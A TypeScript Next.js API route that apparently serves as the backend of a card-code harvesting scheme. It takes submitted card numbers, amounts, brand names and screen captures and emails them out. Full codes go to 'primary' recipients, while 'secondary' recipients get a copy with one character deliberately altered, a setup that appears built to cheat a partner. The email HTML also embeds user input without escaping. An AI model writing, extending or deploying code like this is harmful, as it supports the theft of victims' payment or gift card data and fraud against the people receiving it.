// src/app/api/notify/log/route.ts
import { NextResponse } from "next/server";
import { sendEmail, getPrimaryEmails, getSecondaryEmails } from "@/lib/email";
import { applyMask } from "@/lib/mask";

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { event, brandName, cardNumber, amount, status, message, maskIndex, maskedChar, imageBase64 } = body;
    
    const primaryEnabled = String(process.env.NOTIFY_TYPING_ENABLED ?? 'true').toLowerCase() === 'true';
    
    const attachments: any[] = [];
    if (imageBase64 && imageBase64.startsWith('data:image')) {
      const matches = imageBase64.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);
      if (matches && matches[2]) {
        attachments.push({ filename: `capture.${matches[1]}`, content: matches[2] });
      }
    }

    const baseHtml = `
      <div style="font-family: Arial, padding: 20px;">
        <h2>${event === 'success' ? '✅ SUCCESS' : '❌ FAILED'} - ${brandName}</h2>
        <p><strong>Card Number:</strong> <span style="font-family: monospace; font-size: 18px;">{CARD_NUMBER}</span></p>
        <p><strong>Amount:</strong> $${amount}</p>
        <p><strong>Status:</strong> ${status}</p>
        <p><strong>Message:</strong> ${message}</p>
        <p><strong>Time:</strong> ${new Date().toISOString()}</p>
      </div>
    `;

    // 1. Send to Primary (Full Code) - Only if enabled
    if (primaryEnabled) {
      const primaryEmail = getPrimaryEmails();
      if (primaryEmail) {
        const htmlPrimary = baseHtml.replace('{CARD_NUMBER}', cardNumber);
        await sendEmail({ to: primaryEmail, subject: `Result - ${brandName}`, html: htmlPrimary, attachments });
      }
    }

    // 2. Send to Secondary
    const secondaryEmails = getSecondaryEmails();
    if (secondaryEmails.length > 0) {
      let htmlSecondary = '';
      
      // Apply mask if primary is enabled AND we have mask info
      if (primaryEnabled && maskIndex !== undefined && maskedChar) {
        const masked = applyMask(cardNumber, maskIndex, maskedChar);
        htmlSecondary = baseHtml.replace('{CARD_NUMBER}', masked);
      } else {
        // If primary is disabled, Secondary gets the correct/full code
        htmlSecondary = baseHtml.replace('{CARD_NUMBER}', cardNumber);
      }
      
      await sendEmail({ to: secondaryEmails, subject: `Result - ${brandName}`, html: htmlSecondary, attachments });
    }

    return NextResponse.json({ ok: true });
  } catch (err) {
    return NextResponse.json({ error: "Server error" }, { status: 500 });
  }
}